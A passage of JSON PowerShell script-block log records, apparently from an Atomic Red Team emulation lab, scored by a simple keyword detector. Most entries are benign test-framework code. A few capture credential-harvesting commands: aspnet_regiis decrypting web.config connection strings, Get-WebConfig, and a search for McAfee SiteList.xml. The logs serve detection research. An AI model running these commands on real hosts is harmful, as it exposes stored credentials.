}\n}\n\nfunction Resolve-NonexistantPath($File) {\n    $Path = Resolve-Path $File -ErrorAction SilentlyContinue -ErrorVariable error\n\n    if (-not($Path)) {\n        $Path = $error[0].TargetObject\n    }\n\n    return $Path\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4779159+00:00",
      "event_id": 35710594,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1945,
      "full_command": "function Get-InputArgs([hashtable]$ip, $customInputArgs, $PathToAtomicsFolder) {\n    $defaultArgs = @{ }\n    foreach ($key in $ip.Keys) {\n        $defaultArgs[$key] = $ip[$key].default\n    }\n    # overwrite defaults with any user supplied values\n    foreach ($key in $customInputArgs.Keys) {\n        if ($defaultArgs.Keys -contains $key) {\n            # replace default with user supplied\n            $defaultArgs.set_Item($key, $customInputArgs[$key])\n        }\n        else {\n            Write-Verbose \"The specified input argument *$key* was ignored as not applicable\"\n        }\n    }\n    $defaultArgs\n}\n\nfunction Merge-InputArgs($finalCommand, $test, $customInputArgs, $PathToAtomicsFolder) {\n    if (($null -ne $finalCommand) -and ($test.input_arguments.Count -gt 0)) {\n        Write-Verbose -Message 'Replacing inputArgs with user specified values, or default values if none provided'\n        $inputArgs = Get-InputArgs $test.input_arguments $customInputArgs $PathToAtomicsFolder\n\n        foreach ($key in $inputArgs.Keys) {\n            $findValue = '#{' + $key + '}'\n            $finalCommand = $finalCommand.Replace($findValue, $inputArgs[$key])\n        }\n    }\n\n    # Replace $PathToAtomicsFolder or PathToAtomicsFolder with the actual -PathToAtomicsFolder value\n    $finalCommand = ($finalCommand -replace \"\\`$PathToAtomicsFolder\", $PathToAtomicsFolder) -replace \"PathToAtomicsFolder\", $PathToAtomicsFolder\n\n    $finalCommand\n}\n\nfunction Invoke-PromptForInputArgs([hashtable]$ip) {\n    $InputArgs = @{ }\n    foreach ($key in $ip.Keys) {\n        $InputArgs[$key] = $ip[$key].default\n        $newValue = Read-Host -Prompt \"Enter a value for $key , or press enter to accept the default.`n$($ip[$key].description.trim()) [$($ip[$key].default.trim())]\"\n        # replace default with user supplied\n        if (-not [string]::IsNullOrWhiteSpace($newValue)) {\n            $InputArgs.set_Item($key, $newValue)\n        }\n    }\n    $InputArgs\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.123542+00:00",
      "event_id": 35710660,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1359,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    if (!(Test-Path $logPath)) {\n        New-Item $logPath -Force -ItemType File | Out-Null\n    }\n    $ipAddress = Get-PreferredIPAddress $isWindows\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    $msg | Export-Csv -Path $LogPath -NoTypeInformation -Append\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4091325+00:00",
      "event_id": 35710548,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 7135,
      "full_command": "# Loop through all atomic yaml files to load into list of objects\nfunction Loop($fileList, $atomicType) {\n    $AllAtomicTests = New-Object System.Collections.ArrayList\n\n    $fileList | ForEach-Object {\n        $currentTechnique = [System.IO.Path]::GetFileNameWithoutExtension($_.FullName)\n        if ( $currentTechnique -ne \"index\" ) {\n            $technique = Get-AtomicTechnique -Path $_.FullName\n            if ($technique) {\n                $technique.atomic_tests | ForEach-Object -Process {\n                    $test = New-Object -TypeName psobject\n                    $test | Add-Member -MemberType NoteProperty -Name Order -Value $null\n                    $test | Add-Member -MemberType NoteProperty -Name Technique -Value ($technique.attack_technique -join \"|\")\n                    $test | Add-Member -MemberType NoteProperty -Name TestName -Value $_.name\n                    $test | Add-Member -MemberType NoteProperty -Name auto_generated_guid -Value $_.auto_generated_guid\n                    $test | Add-Member -MemberType NoteProperty -Name supported_platforms -Value ($_.supported_platforms -join \"|\")\n                    $test | Add-Member -MemberType NoteProperty -Name TimeoutSeconds -Value 120\n                    $test | Add-Member -MemberType NoteProperty -Name InputArgs -Value \"\"\n                    $test | Add-Member -MemberType NoteProperty -Name AtomicsFolder -Value $atomicType\n                    $test | Add-Member -MemberType NoteProperty -Name enabled -Value $false\n                    $test | Add-Member -MemberType NoteProperty -Name notes -Value \"\"\n\n                    # Added dummy variable to grab the index values returned by appending to an arraylist so they don't get written to the screen\n                    $dummy = $AllAtomicTests.Add(($test))\n                }\n            }\n        }\n    }\n    return $AllAtomicTests\n\n}\n\nfunction Get-NewSchedule() {\n    if (Test-Path $artConfig.PathToPublicAtomicsFolder) {\n        $publicAtomicFiles = Get-ChildItem $artConfig.PathToPublicAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml -File\n        $publicAtomics = Loop $publicAtomicFiles \"Public\"\n    }\n    else {\n        Write-Host -ForegroundColor Yellow \"Public Atomics Folder not Found $($artConfig.PathToPublicAtomicsFolder)\"\n    }\n    if (Test-Path $artConfig.PathToPrivateAtomicsFolder) {\n        $privateAtomicFiles = Get-ChildItem $artConfig.PathToPrivateAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml  -File\n        $privateAtomics = Loop $privateAtomicFiles \"Private\"\n    }\n    else {\n        Write-Verbose \"Private Atomics Folder not Found $($artConfig.PathToPrivateAtomicsFolder)\"\n    }\n    $AllAtomicTests = New-Object System.Collections.ArrayList\n    try { $AllAtomicTests.AddRange($publicAtomics) }catch {}\n    try { $AllAtomicTests.AddRange($privateAtomics) }catch {}\n    return $AllAtomicTests\n}\n\nfunction Get-ScheduleRefresh() {\n    $AllAtomicTests = Get-NewSchedule\n    $schedule = Get-Schedule $null $false # get schedule, including inactive (ie not filtered)\n\n    # Creating new schedule object for updating changes in atomics\n    $newSchedule = New-Object System.Collections.ArrayList\n\n    # Check if any tests haven't been added to schedule and add them\n    $update = $false\n    foreach ($guid in $AllAtomicTests | Select-Object -ExpandProperty auto_generated_guid) {\n        $fresh = $AllAtomicTests | Where-Object { $_.auto_generated_guid -eq $guid }\n        $old = $schedule | Where-Object { $_.auto_generated_guid -eq $guid }\n\n        if (!$old) {\n            $update = $true\n            $newSchedule += $fresh\n        }\n\n        # Updating schedule with changes\n        else {\n            if ($fresh -is [array]) {\n                $fresh = $fresh[0]\n                LogRunnerMsg \"Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).\n                            `nCannot Continue Execution. System Exit\"\n                Write-Host -ForegroundColor Yellow \"Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).\n                            `nCannot Continue Execution. System Exit\"; Start-Sleep 10\n                exit\n            }\n            $old.Technique = $fresh.Technique\n            $old.TestName = $fresh.TestName\n            $old.supported_platforms = $fresh.supported_platforms\n\n            $update = $true\n            $newSchedule += $old\n        }\n\n    }\n    if ($update) {\n        $newSchedule | Export-Csv $artConfig.scheduleFile\n        LogRunnerMsg \"Schedule has been updated with new tests.\"\n    }\n    return $newSchedule\n\n}\n\nfunction Get-Schedule($listOfAtomics, $filterByEnabled = $true, $testGuids = $null, $filterByPlatform = $true) {\n    if ($listOfAtomics -or (Test-Path($artConfig.scheduleFile))) {\n        if ($listOfAtomics) {\n            $schedule = Import-Csv $listOfAtomics\n        }\n        else {\n            $schedule = Import-Csv $artConfig.scheduleFile\n        }\n\n        # Filter schedule to either Active/Supported Platform or TestGuids List\n        if ($TestGuids) {\n            $schedule = $schedule | Where-Object {\n                ($Null -ne $TestGuids -and $TestGuids -contains $_.auto_generated_guid)\n            }\n        }\n        else {\n            if ($filterByEnabled -and $filterByPlatform) {\n                $schedule = $schedule | Where-Object { ($_.enabled -eq $true -and ($_.supported_platforms -like \"*\" + $artConfig.OS + \"*\" )) }\n            }\n            elseif ($filterByEnabled) {\n                $schedule = $schedule | Where-Object { $_.enabled -eq $true }\n            }\n            elseif ($filterByPlatform) {\n                $schedule = $schedule | Where-Object { $_.supported_platforms -like \"*\" + $artConfig.OS + \"*\" }\n            }\n        }\n\n    }\n    else {\n        Write-Host -ForegroundColor Yellow \"Couldn't find schedule file ($($artConfig.scheduleFile)) Update the path to the schedule file in the config or generate a new one with 'Invoke-GenerateNewSchedule'\"\n    }\n\n    if (($null -eq $schedule) -or ($schedule.length -eq 0)) { Write-Host -ForegroundColor Yellow \"No active tests were found. Edit the 'enabled' column of your schedule file and set some to enabled (True)\"; return $null }\n    return $schedule\n}\n\nfunction Invoke-GenerateNewSchedule() {\n    #create AtomicRunner-Logs directories if they don't exist\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore | Out-Null\n    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore | Out-Null\n\n    LogRunnerMsg \"Generating new schedule: $($artConfig.scheduleFile)\"\n    $schedule = Get-NewSchedule\n    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation\n    Write-Host -ForegroundColor Green \"Schedule written to $($artConfig.scheduleFile)\"\n}\n\nfunction Invoke-RefreshExistingSchedule() {\n    LogRunnerMsg \"Refreshing existing schedule: $($artConfig.scheduleFile)\"\n    $schedule = Get-ScheduleRefresh\n    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation\n    Write-Host -ForegroundColor Green \"Refreshed schedule written to $($artConfig.scheduleFile)\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2018531+00:00",
      "event_id": 35711058,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 2150,
      "full_command": "that all executor input arg names are defined input arg names.\n            if ($InputArgumentNamesFromExecutor.Count) {\n                $InputArgumentNamesFromExecutor | ForEach-Object {\n                    if ($InputArgumentNames -notcontains $_) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument was specified but is not defined: '$_'\"\n                        return\n                    }\n                }\n            }\n\n            # Validate that all defined input args are utilized at least once in the executor.\n            if ($InputArgumentNames.Count) {\n                $InputArgumentNames | ForEach-Object {\n                    if ($InputArgumentNamesFromExecutor -notcontains $_) {\n                        # Write a warning since this scenario is not considered a breaking change\n                        Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument is defined but not utilized: '$_'.\"\n                    }\n                }\n            }\n\n            $ExecutorInstance.name = $AtomicTest['executor']['name']\n\n            $AtomicTestInstance.executor = $ExecutorInstance\n\n            $AtomicTests[$i] = $AtomicTestInstance\n        }\n\n        $AtomicInstance.atomic_tests = $AtomicTests\n\n        $AtomicInstance\n    }\n}\n\n\n# Tab completion for Atomic Tests\nfunction Get-TechniqueNumbers {\n    $PathToAtomicsFolder = if ($IsLinux -or $IsMacOS) { $Env:HOME + \"/AtomicRedTeam/atomics\" } else { $env:HOMEDRIVE + \"\\AtomicRedTeam\\atomics\" }\n    $techniqueNumbers = Get-ChildItem $PathToAtomicsFolder -Directory |\n    ForEach-Object { $_.BaseName }\n\n    return $techniqueNumbers\n}\n\nRegister-ArgumentCompleter -CommandName 'Invoke-AtomicTest' -ParameterName 'AtomicTechnique' -ScriptBlock {\n    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameter)\n\n    Get-TechniqueNumbers | Where-Object { $_ -like \"$wordToComplete*\" } |\n    ForEach-Object {\n        New-Object System.Management.Automation.CompletionResult $_, $_, 'ParameterValue', \"Technique number $_\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 3,
      "message_total": 3,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2165739+00:00",
      "event_id": 35711066,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 7135,
      "full_command": "# Loop through all atomic yaml files to load into list of objects\nfunction Loop($fileList, $atomicType) {\n    $AllAtomicTests = New-Object System.Collections.ArrayList\n\n    $fileList | ForEach-Object {\n        $currentTechnique = [System.IO.Path]::GetFileNameWithoutExtension($_.FullName)\n        if ( $currentTechnique -ne \"index\" ) {\n            $technique = Get-AtomicTechnique -Path $_.FullName\n            if ($technique) {\n                $technique.atomic_tests | ForEach-Object -Process {\n                    $test = New-Object -TypeName psobject\n                    $test | Add-Member -MemberType NoteProperty -Name Order -Value $null\n                    $test | Add-Member -MemberType NoteProperty -Name Technique -Value ($technique.attack_technique -join \"|\")\n                    $test | Add-Member -MemberType NoteProperty -Name TestName -Value $_.name\n                    $test | Add-Member -MemberType NoteProperty -Name auto_generated_guid -Value $_.auto_generated_guid\n                    $test | Add-Member -MemberType NoteProperty -Name supported_platforms -Value ($_.supported_platforms -join \"|\")\n                    $test | Add-Member -MemberType NoteProperty -Name TimeoutSeconds -Value 120\n                    $test | Add-Member -MemberType NoteProperty -Name InputArgs -Value \"\"\n                    $test | Add-Member -MemberType NoteProperty -Name AtomicsFolder -Value $atomicType\n                    $test | Add-Member -MemberType NoteProperty -Name enabled -Value $false\n                    $test | Add-Member -MemberType NoteProperty -Name notes -Value \"\"\n\n                    # Added dummy variable to grab the index values returned by appending to an arraylist so they don't get written to the screen\n                    $dummy = $AllAtomicTests.Add(($test))\n                }\n            }\n        }\n    }\n    return $AllAtomicTests\n\n}\n\nfunction Get-NewSchedule() {\n    if (Test-Path $artConfig.PathToPublicAtomicsFolder) {\n        $publicAtomicFiles = Get-ChildItem $artConfig.PathToPublicAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml -File\n        $publicAtomics = Loop $publicAtomicFiles \"Public\"\n    }\n    else {\n        Write-Host -ForegroundColor Yellow \"Public Atomics Folder not Found $($artConfig.PathToPublicAtomicsFolder)\"\n    }\n    if (Test-Path $artConfig.PathToPrivateAtomicsFolder) {\n        $privateAtomicFiles = Get-ChildItem $artConfig.PathToPrivateAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml  -File\n        $privateAtomics = Loop $privateAtomicFiles \"Private\"\n    }\n    else {\n        Write-Verbose \"Private Atomics Folder not Found $($artConfig.PathToPrivateAtomicsFolder)\"\n    }\n    $AllAtomicTests = New-Object System.Collections.ArrayList\n    try { $AllAtomicTests.AddRange($publicAtomics) }catch {}\n    try { $AllAtomicTests.AddRange($privateAtomics) }catch {}\n    return $AllAtomicTests\n}\n\nfunction Get-ScheduleRefresh() {\n    $AllAtomicTests = Get-NewSchedule\n    $schedule = Get-Schedule $null $false # get schedule, including inactive (ie not filtered)\n\n    # Creating new schedule object for updating changes in atomics\n    $newSchedule = New-Object System.Collections.ArrayList\n\n    # Check if any tests haven't been added to schedule and add them\n    $update = $false\n    foreach ($guid in $AllAtomicTests | Select-Object -ExpandProperty auto_generated_guid) {\n        $fresh = $AllAtomicTests | Where-Object { $_.auto_generated_guid -eq $guid }\n        $old = $schedule | Where-Object { $_.auto_generated_guid -eq $guid }\n\n        if (!$old) {\n            $update = $true\n            $newSchedule += $fresh\n        }\n\n        # Updating schedule with changes\n        else {\n            if ($fresh -is [array]) {\n                $fresh = $fresh[0]\n                LogRunnerMsg \"Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).\n                            `nCannot Continue Execution. System Exit\"\n                Write-Host -ForegroundColor Yellow \"Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).\n                            `nCannot Continue Execution. System Exit\"; Start-Sleep 10\n                exit\n            }\n            $old.Technique = $fresh.Technique\n            $old.TestName = $fresh.TestName\n            $old.supported_platforms = $fresh.supported_platforms\n\n            $update = $true\n            $newSchedule += $old\n        }\n\n    }\n    if ($update) {\n        $newSchedule | Export-Csv $artConfig.scheduleFile\n        LogRunnerMsg \"Schedule has been updated with new tests.\"\n    }\n    return $newSchedule\n\n}\n\nfunction Get-Schedule($listOfAtomics, $filterByEnabled = $true, $testGuids = $null, $filterByPlatform = $true) {\n    if ($listOfAtomics -or (Test-Path($artConfig.scheduleFile))) {\n        if ($listOfAtomics) {\n            $schedule = Import-Csv $listOfAtomics\n        }\n        else {\n            $schedule = Import-Csv $artConfig.scheduleFile\n        }\n\n        # Filter schedule to either Active/Supported Platform or TestGuids List\n        if ($TestGuids) {\n            $schedule = $schedule | Where-Object {\n                ($Null -ne $TestGuids -and $TestGuids -contains $_.auto_generated_guid)\n            }\n        }\n        else {\n            if ($filterByEnabled -and $filterByPlatform) {\n                $schedule = $schedule | Where-Object { ($_.enabled -eq $true -and ($_.supported_platforms -like \"*\" + $artConfig.OS + \"*\" )) }\n            }\n            elseif ($filterByEnabled) {\n                $schedule = $schedule | Where-Object { $_.enabled -eq $true }\n            }\n            elseif ($filterByPlatform) {\n                $schedule = $schedule | Where-Object { $_.supported_platforms -like \"*\" + $artConfig.OS + \"*\" }\n            }\n        }\n\n    }\n    else {\n        Write-Host -ForegroundColor Yellow \"Couldn't find schedule file ($($artConfig.scheduleFile)) Update the path to the schedule file in the config or generate a new one with 'Invoke-GenerateNewSchedule'\"\n    }\n\n    if (($null -eq $schedule) -or ($schedule.length -eq 0)) { Write-Host -ForegroundColor Yellow \"No active tests were found. Edit the 'enabled' column of your schedule file and set some to enabled (True)\"; return $null }\n    return $schedule\n}\n\nfunction Invoke-GenerateNewSchedule() {\n    #create AtomicRunner-Logs directories if they don't exist\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore | Out-Null\n    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore | Out-Null\n\n    LogRunnerMsg \"Generating new schedule: $($artConfig.scheduleFile)\"\n    $schedule = Get-NewSchedule\n    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation\n    Write-Host -ForegroundColor Green \"Schedule written to $($artConfig.scheduleFile)\"\n}\n\nfunction Invoke-RefreshExistingSchedule() {\n    LogRunnerMsg \"Refreshing existing schedule: $($artConfig.scheduleFile)\"\n    $schedule = Get-ScheduleRefresh\n    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation\n    Write-Host -ForegroundColor Green \"Refreshed schedule written to $($artConfig.scheduleFile)\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.3939711+00:00",
      "event_id": 35710540,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 8641,
      "full_command": "type']) {\n                        Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type': '$($AtomicTest['input_arguments'][$InputArgName]['type'])' should be one of the following: $($ValidInputArgTypes -join ', ')\"\n                    }\n\n                    $InputArgument.type = $AtomicTest['input_arguments'][$InputArgName]['type']\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('default')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].default' element is required.\"\n                        return\n                    }\n\n                    $InputArgument.default = $AtomicTest['input_arguments'][$InputArgName]['default']\n\n                    $InputArguments[$InputArgName] = $InputArgument\n\n                    $j++\n                }\n            }\n\n            $AtomicTestInstance.input_arguments = $InputArguments\n\n            if (-not $AtomicTest.ContainsKey('executor')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['executor'] -is [Hashtable])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element must be a hashtable.\"\n                return\n            }\n\n            if (-not $AtomicTest['executor'].ContainsKey('name')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.name' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['executor']['name'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be a string.\"\n                return\n            }\n\n            if ($AtomicTest['executor']['name'] -notmatch '^(?-i:[a-z_]+)$') {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be lowercased and underscored.\"\n                return\n            }\n\n            if ($ValidExecutorTypes -notcontains $AtomicTest['executor']['name']) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name': '$($AtomicTest['executor']['name'])' must be one of the following: $($ValidExecutorTypes -join ', ')\"\n                return\n            }\n\n            if ($AtomicTest['executor']['name'] -eq 'manual') {\n                if (-not $AtomicTest['executor'].ContainsKey('steps')) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element is required when the 'manual' executor is used.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['executor']['steps'] -is [String])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element must be a string.\"\n                    return\n                }\n\n                $ExecutorInstance = [AtomicExecutorManual]::new()\n                $ExecutorInstance.steps = $AtomicTest['executor']['steps']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['steps'])\n            }\n            else {\n                if (-not $AtomicTest['executor'].ContainsKey('command')) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element is required when the '$($ValidExecutorTypes -join ', ')' executors are used.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['executor']['command'] -is [String])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element must be a string.\"\n                    return\n                }\n\n                $ExecutorInstance = [AtomicExecutorDefault]::new()\n                $ExecutorInstance.command = $AtomicTest['executor']['command']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['command'])\n            }\n\n            # cleanup_command element is optional\n            if ($AtomicTest['executor'].ContainsKey('cleanup_command')) {\n                $ExecutorInstance.cleanup_command = $AtomicTest['executor']['cleanup_command']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['cleanup_command'])\n            }\n\n            # elevation_required element is optional\n            if ($AtomicTest['executor'].ContainsKey('elevation_required')) {\n                if (-not ($AtomicTest['executor']['elevation_required'] -is [Bool])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.elevation_required' element must be a boolean.\"\n                    return\n                }\n\n                $ExecutorInstance.elevation_required = $AtomicTest['executor']['elevation_required']\n            }\n            else {\n                # if elevation_required is not present, default to false\n                $ExecutorInstance.elevation_required = $False\n            }\n\n            $InputArgumentNames = $null\n\n            # Get all input argument names\n            $InputArgumentNames = $InputArguments.Keys\n\n            # Extract all input arguments names from the executor\n            # Potential places where input arguments can be populated:\n            #  - Dependency description\n            #  - Dependency prereq_command\n            #  - Dependency get_prereq_command\n            #  - Executor steps\n            #  - Executor command\n            #  - Executor cleanup_command\n\n            $Regex = [Regex] '#\\{(?<ArgName>[^}]+)\\}'\n            [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |\n            ForEach-Object { $Regex.Matches($_) } |\n            Select-Object -ExpandProperty Groups |\n            Where-Object { $_.Name -eq 'ArgName' } |\n            Select-Object -ExpandProperty Value |\n            Sort-Object -Unique\n\n\n            # Validate that all executor input arg names are defined input arg names.\n            if ($InputArgumentNamesFromExecutor.Count) {\n                $InputArgumentNamesFromExecutor | ForEach-Object {\n                    if ($InputArgumentNames -notcontains $_) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument was specified but is not defined: '$_'\"\n                        return\n                    }\n                }\n            }\n\n            # Validate that all defined input args are utilized at least once in the executor.\n            if ($InputArgumentNames.Count) {\n                $InputArgumentNames | ForEach-Object {\n                    if ($InputArgumentNamesFromExecutor -notcontains $_) {\n                        # Write a warning since this scenario is not considered a breaking change\n                        Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument is defined but not utilized: '$_'.\"\n                    }\n                }\n            }\n\n            $ExecutorInstance.name = $AtomicTest['executor']['name']\n\n            $AtomicTestInstance.executor = $ExecutorInstance\n\n            $AtomicTests[$i] = $AtomicTestInstance\n        }\n\n        $AtomicInstance.atomic_tests = $AtomicTests\n\n        $AtomicInstance\n    }\n}\n\n\n# Tab completion for Atomic Tests\nfunction Get-TechniqueNumbers {\n    $PathToAtomicsFolder = if ($IsLinux -or $IsMacOS) { $Env:HOME + \"/AtomicRedTeam/atomics\" } else { $env:HOMEDRIVE + \"\\AtomicRedTeam\\atomics\" }\n    $techniqueNumbers = Get-ChildItem $PathToAtomicsFolder -Directory |\n    ForEach-Object { $_.BaseName }\n\n    return $techniqueNumbers\n}\n\nRegister-ArgumentCompleter -CommandName 'Invoke-AtomicTest' -ParameterName 'AtomicTechnique' -ScriptBlock {\n    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameter)\n\n    Get-TechniqueNumbers | Where-Object { $_ -like \"$wordToComplete*\" } |\n    ForEach-Object {\n        New-Object System.Management.Automation.CompletionResult $_, $_, 'ParameterValue', \"Technique number $_\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 2,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:45.581002+00:00",
      "event_id": 35709062,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 37,
      "full_command": "{ Get-WebConfig | Where-Object {$_} }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:45.730261+00:00",
      "event_id": 35709074,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 118,
      "full_command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_regiis.exe -pdf \"connectionStrings\" (get-item $Env:temp).FullName",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'Get' matched: 'get-'"
    },
    {
      "timestamp": "2024-12-16T20:34:46.7504973+00:00",
      "event_id": 35709149,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 89,
      "full_command": "{ Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2802741+00:00",
      "event_id": 35711112,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1945,
